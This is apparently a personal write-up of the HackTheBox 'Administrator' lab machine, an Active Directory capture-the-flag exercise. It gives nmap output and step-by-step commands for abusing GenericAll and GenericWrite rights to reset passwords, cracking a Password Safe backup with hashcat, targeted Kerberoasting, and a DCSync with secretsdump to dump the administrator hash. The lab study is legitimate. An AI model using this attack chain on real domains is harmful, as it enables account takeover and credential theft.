---
title: "HackTheBox - Administrator"
permalink: /CTFs/HTB-Administrator/
date: 2024-11-22
categories: [HackTheBox]
tags: [Active Directory, PsRemote, DCSync, GenericWrite]
math: true
mermaid: true
image:
  path: /assets/img/CTFs/Administrator/back.jpg
---
This machine necessitates a basic understanding of active directory and how to take use of both `DCSync` and `GenericWrite` misconfigurations.\
The author provides creds for initial access
> As is common in real life Windows pentests, you will start the Administrator box with credentials for the following account: Olivia / ichliebedich

## Recon
Nmap output
``` bash
# Nmap 7.94SVN scan initiated Fri Nov 22 20:56:56 2024 as: nmap --privileged -sC -sV -T4 -p- -oN nmap.scan -vv 10.10.11.42
Increasing send delay for 10.10.11.42 from 0 to 5 due to 677 out of 1691 dropped probes since last increase.
Increasing send delay for 10.10.11.42 from 5 to 10 due to 11 out of 18 dropped probes since last increase.
Nmap scan report for administrator.htb0 (10.10.11.42)
Host is up, received echo-reply ttl 127 (0.17s latency).
Scanned at 2024-11-22 20:56:56 EET for 819s
Not shown: 65509 closed tcp ports (reset)
PORT      STATE SERVICE       REASON          VERSION
21/tcp    open  ftp           syn-ack ttl 127 Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-11-22 19:32:19Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
62760/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
65336/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
65341/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
65352/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
65363/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
65399/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 35406/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 26601/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 52617/udp): CLEAN (Timeout)
|   Check 4 (port 36581/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time:
|   date: 2024-11-22T19:33:17
|_  start_date: N/A
|_clock-skew: 22m51s

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Nov 22 21:10:35 2024 -- 1 IP address (1 host up) scanned in 819.81 seconds
```
port `88` is open so  it’s highly likely a Domain Controller, from ldap output we can see the domain is `administrator.htb`.

After adding it to `/etc/hosts` I started to mess around in `SMB` shares but it was fruitless, I noticed port `21` is running so I tried to connect to it using the provided creds but I couldn't with this user

I run bloodhound to get more info
```bash
bloodhound-python -u Olivia -p  -c All -d ichliebedich -dc administrator.htb -ns 10.10.11.42
```

---
## User flag

After messing around in `bloodhound` I noticed this
![image](/assets/img/CTFs/Administrator/olivia_micheal.png)
`GenericAll` gives the right to `Olivia` to change `Micheal` Password without knowing it, so I used `net.exe` (connected with `evil-winrm` using `olivia` creds) to change `Micheal` password
```bash
net user micheal michealpassword123!
```

After owning `micheal` I searched for his rights and I found the following
![image](/assets/img/CTFs/Administrator/michael_benjamin.png)
I tried using `net` cmdlet again but it failed, so I used `bloodyAD`
```bash
bloodyAD.py --host "10.10.11.42" -d "administrator.htb" -u "michael" -p "michealpassword123!" set password "benjamin" "benjaminpassword123!"
```
Now we own 3 users.

I got stuck here for some time but I remembered the open port on `21`, so tried to connect to it with the newly-owned users and got a hit on the `benjamin` user

There was a file called `Backup.psafe3` so I donwloaded it, I searched for applications that support this type of files and I found [password safe](https://pwsafe.org/).
> the file can also be dowloaded using NetExec:
```bash
nxc ftp administrator.htb -u 'benjamin' -p ****** --get Backup.psafe3
```



The app asked for the file and master password for the file, `hashcat` has module for it
```bash
hashcat Backup.psafe3 /usr/share/wordlists/rockyou.txt -m 5200 --force
```
And it cracked the safe!
![image](/assets/img/CTFs/Administrator/safe.png)

`emily` passowrd was valid
![image](/assets/img/CTFs/Administrator/user_pwned.png)

---
## Root flag
After poking around I saw something interesting
![image](/assets/img/CTFs/Administrator/methodology.png)

`emily` has `GenericWrite` over `ethan`, and `ethan` has `DCSync` over the domain. So our methodology here is going to be getting the hash for `ethan` and crack it to be able to get the hash of `administrator`.

### GenericWrite
It can be exploited using [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
![image](/assets/img/CTFs/Administrator/ethan_hash.png)
running `hashcat` on the hash and it was crackable

### DCSync
with `ethan` password now we can use `secretsdump` from Impacket to get `administrator` hash
![image](/assets/img/CTFs/Administrator/admin_hash.png)

And the machine is pwned
![image](/assets/img/CTFs/Administrator/root_pwned.png)